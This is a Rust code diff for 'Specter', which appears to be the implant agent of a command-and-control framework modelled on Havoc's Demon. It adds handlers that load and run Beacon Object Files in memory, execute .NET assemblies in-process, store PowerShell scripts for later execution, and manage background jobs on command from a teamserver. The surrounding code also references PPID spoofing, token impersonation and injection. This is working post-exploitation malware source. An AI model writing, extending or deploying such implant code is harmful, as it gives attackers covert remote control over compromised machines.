@@ -17,16 +17,23 @@ use std::time::UNIX_EPOCH;
 
 use red_cell_common::demon::{
     DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonInjectError, DemonInjectWay,
-    DemonKerberosCommand, DemonNetCommand, DemonPackage, DemonProcessCommand, DemonTokenCommand,
-    DemonTransferCommand,
+    DemonJobCommand, DemonKerberosCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
+    DemonTokenCommand, DemonTransferCommand,
 };
 use tracing::{info, warn};
 
+use crate::coffeeldr;
 use crate::config::SpecterConfig;
+use crate::dotnet;
 use crate::download::{
     DOWNLOAD_MODE_OPEN, DOWNLOAD_REASON_REMOVED, DownloadState, DownloadTracker,
 };
+use crate::job::JobStore;
 use crate::token::TokenVault;
+
+/// In-memory PowerShell script store.  The teamserver sends script bytes via
+/// `CommandPsImport`; the agent accumulates them for later execution.
+pub type PsScriptStore = Vec<u8>;
 
 // ─── In-memory file staging ─────────────────────────────────────────────────
 
@@ -104,6 +111,8 @@ pub fn dispatch(
     token_vault: &mut TokenVault,
     downloads: &mut DownloadTracker,
     mem_files: &mut MemFileStore,
+    job_store: &mut JobStore,
+    ps_scripts: &mut PsScriptStore,
 ) -> DispatchResult {
     let cmd = match DemonCommand::try_from(package.command_id) {
         Ok(c) => c,
@@ -135,6 +144,15 @@ pub fn dispatch(
         DemonCommand::CommandProcPpidSpoof => handle_proc_ppid_spoof(&package.payload, config),
         DemonCommand::CommandKerberos => handle_kerberos(&package.payload),
         DemonCommand::CommandConfig => handle_config(&package.payload, config),
+        DemonCommand::CommandInlineExecute => {
+            handle_inline_execute(&package.payload, config, mem_files)
+        }
+        DemonCommand::CommandJob => handle_job(&package.payload, job_store),
+        DemonCommand::CommandPsImport => handle_ps_import(&package.payload, ps_scripts, mem_files),
+        DemonCommand::CommandAssemblyInlineExecute => {
+            handle_assembly_inline_execute(&package.payload, mem_files)
+        }
+        DemonCommand::CommandAssemblyListVersions => handle_assembly_list_versions(),
         DemonCommand::CommandScreenshot => handle_screenshot(),
         DemonCommand::CommandExit => DispatchResult::Exit,
         // These are agent-to-server callbacks; ignore if received from server.
@@ -3479,6 +3497,439 @@ fn handle_screenshot() -> DispatchResult {
     DispatchResult::Respond(Response::new(DemonCommand::CommandScreenshot, out))
 }
 
+// ─── COMMAND_INLINE_EXECUTE (20) ────────────────────────────────────────────
+
+/// Handle a `CommandInlineExecute` task: load and execute a BOF (COFF object file).
+///
+/// Incoming payload (LE): `[function_name: string][bof_file_id: u32][params_file_id: u32][flags: i32]`
+///
+/// `flags`:
+///   - 0 → non-threaded execution
+///   - 1 → threaded execution
+///   - 2 → use agent config default (`coffee_threaded`)
+///
+/// The handler retrieves the BOF object and parameter data from the in-memory
+/// file store, then delegates to the [`coffeeldr`] module for COFF loading and
+/// execution.  Results are returned as one or more callbacks with the
+/// `CommandInlineExecute` command ID.
+fn handle_inline_execute(
+    payload: &[u8],
+    config: &SpecterConfig,
+    mem_files: &mut MemFileStore,
+) -> DispatchResult {
+    let mut offset = 0;
+
+    // Parse function name (length-prefixed UTF-8 string)
+    let func_name_bytes = match parse_bytes_le(payload, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("InlineExecute: failed to parse function name: {e}");
+            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
+        }
+    };
+    let function_name =
+        String::from_utf8_lossy(&func_name_bytes).trim_end_matches('\0').to_string();
+
+    let bof_file_id = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("InlineExecute: failed to parse bof_file_id: {e}");
+            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
+        }
+    };
+
+    let params_file_id = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("InlineExecute: failed to parse params_file_id: {e}");
+            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
+        }
+    };
+
+    let flags = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v as i32,
+        Err(e) => {
+            warn!("InlineExecute: failed to parse flags: {e}");
+            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
+        }
+    };
+
+    // Retrieve BOF object data from MemFileStore
+    let bof_data = match mem_files.get(&bof_file_id) {
+        Some(mf) if mf.is_complete() => mf.data.clone(),
+        Some(_) => {
+            warn!(bof_file_id, "InlineExecute: BOF memfile not complete");
+            mem_files.remove(&bof_file_id);
+            mem_files.remove(&params_file_id);
+            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
+        }
+        None => {
+            warn!(bof_file_id, "InlineExecute: BOF memfile not found");
+            mem_files.remove(&params_file_id);
+            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
+        }
+    };
+
+    // Retrieve argument data from MemFileStore (may be empty)
+    let arg_data = match mem_files.get(&params_file_id) {
+        Some(mf) if mf.is_complete() => mf.data.clone(),
+        Some(_) => {
+            warn!(params_file_id, "InlineExecute: params memfile not complete");
+            mem_files.remove(&bof_file_id);
+            mem_files.remove(&params_file_id);
+            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
+        }
+        None => Vec::new(), // No params is valid
+    };
+
+    // Determine threading mode
+    let threaded = match flags {
+        0 => false,
+        1 => true,
+        _ => config.coffee_threaded, // use config default
+    };
+
+    info!(
+        function = %function_name,
+        bof_size = bof_data.len(),
+        arg_size = arg_data.len(),
+        threaded,
+        "InlineExecute: executing BOF"
+    );
+
+    // Execute the BOF
+    let result = coffeeldr::coffee_execute(&function_name, &bof_data, &arg_data, threaded);
+
+    // Clean up memfiles
+    mem_files.remove(&bof_file_id);
+    mem_files.remove(&params_file_id);
+
+    // Convert BOF callbacks to dispatch responses
+    let responses: Vec<Response> = result
+        .callbacks
+        .into_iter()
+        .map(|cb| {
+            let mut out = Vec::new();
+            write_u32_le(&mut out, cb.callback_type);
+            out.extend_from_slice(&cb.payload);
+            Response::new(DemonCommand::CommandInlineExecute, out)
+        })
+        .collect();
+
+    if responses.len() == 1 {
+        DispatchResult::Respond(responses.into_iter().next().unwrap_or_else(|| {
+            let mut out = Vec::new();
+            write_u32_le(&mut out, coffeeldr::BOF_COULD_NOT_RUN);
+            Response::new(DemonCommand::CommandInlineExecute, out)
+        }))
+    } else {
+        DispatchResult::MultiRespond(responses)
+    }
+}
+
+/// Build an inline-execute error response with the given BOF callback type.
+fn inline_execute_error(callback_type: u32) -> DispatchResult {
+    let mut out = Vec::new();
+    write_u32_le(&mut out, callback_type);
+    DispatchResult::Respond(Response::new(DemonCommand::CommandInlineExecute, out))
+}
+
+// ─── COMMAND_JOB (21) ──────────────────────────────────────────────────────
+
+/// Handle a `CommandJob` task: list, suspend, resume, or kill background jobs.
+///
+/// Incoming payload (LE): `[subcommand: u32][optional job_id: u32]`
+///
+/// Outgoing payload (LE):
+///   - **List**: `[1: u32][repeated: job_id: u32, type: u32, state: u32]`
+///   - **Suspend/Resume/Kill**: `[subcmd: u32][job_id: u32][success: u32]`
+fn handle_job(payload: &[u8], job_store: &mut JobStore) -> DispatchResult {
+    let mut offset = 0;
+
+    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandJob: failed to parse subcommand: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let subcmd = match DemonJobCommand::try_from(subcmd_raw) {
+        Ok(c) => c,
+        Err(_) => {
+            warn!(subcmd_raw, "CommandJob: unknown subcommand");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    info!(subcommand = ?subcmd, "CommandJob dispatch");
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    match subcmd {
+        DemonJobCommand::List => {
+            for job in job_store.list() {
+                write_u32_le(&mut out, job.job_id);
+                write_u32_le(&mut out, job.job_type);
+                write_u32_le(&mut out, job.state);
+            }
+        }
+        DemonJobCommand::Suspend => {
+            let job_id = match parse_u32_le(payload, &mut offset) {
+                Ok(v) => v,
+                Err(e) => {
+                    warn!("CommandJob/Suspend: failed to parse job_id: {e}");
+                    return DispatchResult::Ignore;
+                }
+            };
+            let success = job_store.suspend(job_id);
+            write_u32_le(&mut out, job_id);
+            write_u32_le(&mut out, u32::from(success));
+        }
+        DemonJobCommand::Resume => {
+            let job_id = match parse_u32_le(payload, &mut offset) {
+                Ok(v) => v,
+                Err(e) => {
+                    warn!("CommandJob/Resume: failed to parse job_id: {e}");
+                    return DispatchResult::Ignore;
+                }
+            };
+            let success = job_store.resume(job_id);
+            write_u32_le(&mut out, job_id);
+            write_u32_le(&mut out, u32::from(success));
+        }
+        DemonJobCommand::KillRemove => {
+            let job_id = match parse_u32_le(payload, &mut offset) {
+                Ok(v) => v,
+                Err(e) => {
+                    warn!("CommandJob/Kill: failed to parse job_id: {e}");
+                    return DispatchResult::Ignore;
+                }
+            };
+            let success = job_store.kill(job_id);
+            write_u32_le(&mut out, job_id);
+            write_u32_le(&mut out, u32::from(success));
+        }
+        DemonJobCommand::Died => {
+            // Internal callback — the agent detects a tracked process has died
+            // and reports it.  Currently a no-op for Specter.
+            info!("CommandJob/Died: internal callback (no-op)");
+            return DispatchResult::Ignore;
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandJob, out))
+}
+
+// ─── COMMAND_PS_IMPORT (0x1011) ────────────────────────────────────────────
+
+/// Handle a `CommandPsImport` task: store a PowerShell script in memory.
+///
+/// Incoming payload (LE): `[script_mem_file_id: u32]`
+///
+/// The script bytes are retrieved from the in-memory file store (uploaded via
+/// `CommandMemFile`).  If no memfile ID is present in the payload, the raw
+/// payload bytes are used directly (backwards-compatible path).
+///
+/// Response callback: `[output: string]` — empty string on success, error
+/// message on failure.
+fn handle_ps_import(
+    payload: &[u8],
+    ps_scripts: &mut PsScriptStore,
+    mem_files: &mut MemFileStore,
+) -> DispatchResult {
+    let mut offset = 0;
+
+    // Try to parse a memfile ID first; fall back to raw bytes
+    let script_data = if let Ok(mem_file_id) = parse_u32_le(payload, &mut offset) {
+        match mem_files.remove(&mem_file_id) {
+            Some(mf) if mf.is_complete() => mf.data,
+            Some(_) => {
+                warn!(mem_file_id, "PsImport: memfile not complete");
+                return ps_import_response("PowerShell import failed: incomplete transfer");
+            }
+            None => {
+                // No memfile with this ID — treat remaining payload as script bytes
+                if payload.len() > 4 {
+                    payload[4..].to_vec()
+                } else {
+                    return ps_import_response("PowerShell import failed: no script data");
+                }
+            }
+        }
+    } else {
+        // No u32 parseable — use entire payload as script data
+        payload.to_vec()
+    };
+
+    if script_data.is_empty() {
+        return ps_import_response("PowerShell import failed: empty script");
+    }
+
+    info!(size = script_data.len(), "PsImport: script stored");
+    *ps_scripts = script_data;
+
+    // Empty string = success
+    ps_import_response("")
+}
+
+/// Build a `CommandPsImport` callback response.
+///
+/// Payload (LE): `[output: bytes (UTF-8 string)]` — empty string means success.
+fn ps_import_response(message: &str) -> DispatchResult {
+    let mut out = Vec::new();
+    write_bytes_le(&mut out, message.as_bytes());
+    DispatchResult::Respond(Response::new(DemonCommand::CommandPsImport, out))
+}
+
+// ─── COMMAND_ASSEMBLY_INLINE_EXECUTE (0x2001) ──────────────────────────────
+
+/// Handle a `CommandAssemblyInlineExecute` task: run a .NET assembly in-process.
+///
+/// Incoming payload (LE):
+///   `[pipe_name: wstring][app_domain: wstring][net_version: wstring]`
+///   `[assembly_mem_file_id: u32][assembly_args: wstring]`
+///
+/// The assembly PE bytes are retrieved from the in-memory file store.
+fn handle_assembly_inline_execute(payload: &[u8], mem_files: &mut MemFileStore) -> DispatchResult {
+    let mut offset = 0;
+
+    // Parse pipe name (UTF-16LE wstring)
+    let pipe_bytes = match parse_bytes_le(payload, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("AssemblyInlineExecute: failed to parse pipe_name: {e}");
+            return assembly_error();
+        }
+    };
+    let pipe_name = decode_utf16le_null(&pipe_bytes);
+
+    // Parse AppDomain name
+    let domain_bytes = match parse_bytes_le(payload, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("AssemblyInlineExecute: failed to parse app_domain: {e}");
+            return assembly_error();
+        }
+    };
+    let app_domain = decode_utf16le_null(&domain_bytes);
+
+    // Parse .NET version
+    let version_bytes = match parse_bytes_le(payload, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("AssemblyInlineExecute: failed to parse net_version: {e}");
+            return assembly_error();
+        }
+    };
+    let net_version = decode_utf16le_null(&version_bytes);
+
+    // Parse assembly memfile ID
+    let mem_file_id = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("AssemblyInlineExecute: failed to parse mem_file_id: {e}");
+            return assembly_error();
+        }
+    };
+
+    // Parse assembly arguments
+    let args_bytes = parse_bytes_le(payload, &mut offset).unwrap_or_default();
+    let assembly_args = decode_utf16le_null(&args_bytes);
+
+    // Retrieve assembly data from MemFileStore
+    let assembly_data = match mem_files.remove(&mem_file_id) {
+        Some(mf) if mf.is_complete() => mf.data,
+        Some(_) => {
+            warn!(mem_file_id, "AssemblyInlineExecute: memfile not complete");
+            return assembly_error();
+        }
+        None => {
+            warn!(mem_file_id, "AssemblyInlineExecute: memfile not found");
+            return assembly_error();
+        }
+    };
+
+    info!(
+        pipe = %pipe_name,
+        domain = %app_domain,
+        version = %net_version,
+        assembly_size = assembly_data.len(),
+        args = %assembly_args,
+        "AssemblyInlineExecute: executing .NET assembly"
+    );
+
+    // Execute the assembly
+    let result = dotnet::dotnet_execute(
+        &pipe_name,
+        &app_domain,
+        &net_version,
+        &assembly_data,
+        &assembly_args,
+    );
+
+    // Convert callbacks to dispatch responses
+    let mut responses: Vec<Response> = result
+        .callbacks
+        .into_iter()
+        .map(|cb| {
+            let mut out = Vec::new();
+            write_u32_le(&mut out, cb.info_id);
+            out.extend_from_slice(&cb.payload);
+            Response::new(DemonCommand::CommandAssemblyInlineExecute, out)
+        })
+        .collect();
+
+    // If there's captured output, send it as a standard output callback
+    if !result.output.is_empty() {
+        let mut out = Vec::new();
+        write_u32_le(&mut out, 0x00); // CALLBACK_OUTPUT
+        write_bytes_le(&mut out, &result.output);
+        responses.push(Response::new(DemonCommand::CommandOutput, out));
+    }
+
+    if responses.len() == 1 {
+        DispatchResult::Respond(
+            responses.into_iter().next().unwrap_or_else(assembly_error_response),
+        )
+    } else {
+        DispatchResult::MultiRespond(responses)
+    }
+}
+
+/// Build a `CommandAssemblyInlineExecute` FAILED response.
+fn assembly_error() -> DispatchResult {
+    DispatchResult::Respond(assembly_error_response())
+}
+
+/// Build a single DOTNET_INFO_FAILED response.
+fn assembly_error_response() -> Response {
+    let mut out = Vec::new();
+    write_u32_le(&mut out, dotnet::DOTNET_INFO_FAILED);
+    Response::new(DemonCommand::CommandAssemblyInlineExecute, out)
+}
+
+// ─── COMMAND_ASSEMBLY_LIST_VERSIONS (0x2003) ───────────────────────────────
+
+/// Handle a `CommandAssemblyListVersions` task: enumerate installed CLR versions.
+///
+/// No incoming data.
+///
+/// Outgoing payload (LE): repeated `[version: wstring (UTF-16LE)]` entries.
+fn handle_assembly_list_versions() -> DispatchResult {
+    let versions = dotnet::enumerate_clr_versions();
+
+    info!(count = versions.len(), "AssemblyListVersions: found CLR versions");
+
+    let mut out = Vec::new();
+    for version in &versions {
+        write_utf16le(&mut out, version);
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandAssemblyListVersions, out))
+}
+
 // ─── Payload parsing helpers (server → agent, little-endian) ─────────────────
 
 /// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
@@ -3774,6 +4225,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
 
         assert_eq!(config.sleep_delay_ms, 3000);
@@ -3801,6 +4254,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
         assert_eq!(config.sleep_jitter, 100);
     }
@@ -3815,6 +4270,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -3832,6 +4289,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
 
         let DispatchResult::Respond(resp) = result else {
@@ -3865,6 +4324,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
 
         let DispatchResult::Respond(resp) = result else {
@@ -3891,6 +4352,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -3912,6 +4375,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
@@ -3935,6 +4400,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -3994,6 +4461,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4073,6 +4542,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
 
         let DispatchResult::MultiRespond(resps) = result else {
@@ -4111,6 +4582,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
 
         let DispatchResult::MultiRespond(resps) = result else {
@@ -4165,7 +4638,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4181,7 +4656,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4197,7 +4674,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Exit
         ));
@@ -4235,6 +4714,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got {result:?}");
@@ -4254,6 +4735,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4272,6 +4755,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4291,6 +4776,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4340,6 +4827,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4361,6 +4850,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4382,6 +4873,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4402,6 +4895,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4421,6 +4916,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         );
         assert!(matches!(result, DispatchResult::Ignore));
     }
@@ -4440,6 +4937,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4461,6 +4960,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4484,6 +4985,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4506,7 +5009,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4526,6 +5031,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4548,7 +5055,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4567,6 +5076,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4608,7 +5119,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4624,7 +5137,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4640,6 +5155,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4659,6 +5176,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4678,6 +5197,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4701,7 +5222,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4718,6 +5241,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4735,7 +5260,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4752,6 +5279,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4775,6 +5304,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4792,6 +5323,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4809,7 +5342,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4826,6 +5361,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4847,6 +5384,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4873,6 +5412,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4890,6 +5431,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4908,6 +5451,8 @@ mod tests {
             &mut TokenVault::new(),
             &mut DownloadTracker::new(),
             &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
         ) else {
             panic!("expected Respond");
         };
@@ -4948,7 +5493,9 @@ mod tests {
                 &mut config,
                 &mut TokenVault::new(),
                 &mut DownloadTracker::new(),
-                &mut HashMap::new()
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
             ),
             DispatchResult::Ignore
         ));
@@ -4973,9 +5520,15 @@ mod tests {
         // Token ID 99 doesn't exist.
         let args = 99u32.to_le_bytes().to_vec();
         let package = token_package(DemonTokenCommand::Impersonate, &args);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
@@ -4995,9 +5548,15 @@ mod tests {
         let mut vault = TokenVault::new();
         let mut downloads = DownloadTracker::new();
         let package = token_package(DemonTokenCommand::List, &[]);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
@@ -5031,9 +5590,15 @@ mod tests {
         });
 
         let package = token_package(DemonTokenCommand::List, &[]);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
 
@@ -5075,9 +5640,15 @@ mod tests {
         let mut vault = TokenVault::new();
         let mut downloads = DownloadTracker::new();
         let package = token_package(DemonTokenCommand::GetUid, &[]);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
@@ -5100,9 +5671,15 @@ mod tests {
         let mut vault = TokenVault::new();
         let mut downloads = DownloadTracker::new();
         let package = token_package(DemonTokenCommand::Revert, &[]);
